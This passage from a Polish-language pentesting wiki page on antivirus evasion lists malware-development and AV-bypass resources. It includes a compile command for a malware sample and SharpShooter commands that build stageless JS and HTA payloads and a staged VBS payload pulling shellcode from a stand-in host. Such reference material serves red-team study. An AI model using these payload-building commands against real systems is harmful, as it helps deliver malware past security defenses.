i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Używanie Pythona do budowy przykładów injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

{{#include ../banners/hacktricks-training.md}}
